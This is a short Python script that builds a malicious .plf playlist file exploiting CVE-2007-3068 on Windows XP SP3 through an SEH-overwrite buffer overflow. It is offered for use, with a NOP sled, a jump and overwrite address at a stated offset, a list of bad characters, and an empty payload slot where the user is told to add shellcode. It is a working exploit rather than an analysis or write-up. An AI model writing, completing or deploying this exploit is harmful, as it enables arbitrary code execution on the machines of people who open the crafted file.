#!/usr/bin/python
# CVE-2007-3068
# Operating Systems Tested:
# 	Windows XP Professional Service Pack 3 (x86)
# Bad Characters: \x00\x0a\x0d\x1a
# SEH Offset: 612
import argparse

payload = ""

parser = argparse.ArgumentParser()
parser.add_argument("--filename", help="Creates exploit with specified filename")
arguments = parser.parse_args()
nextSEH = "\xeb\x06\x90\x90"
SEH = "\xfb\xe5\x62\x61"
if len(payload) > 0:
	filename = "exploit.plf"
	if arguments.filename:
		filename = arguments.filename
        buffer = ("\x90" * 608) + nextSEH + SEH + payload + ("\x90" * (2000 - 608 - len(nextSEH) - len(SEH) - len(payload)))
	print("[*] Creating " + filename)
	file = open(filename, 'w')
	file.write(buffer)
	file.close()
	print("[*] " + filename + " had been created succesfully.")
else:
	print("[-] \"payload\" is empty. Please add your shellcode to the \"payload\" variable.")
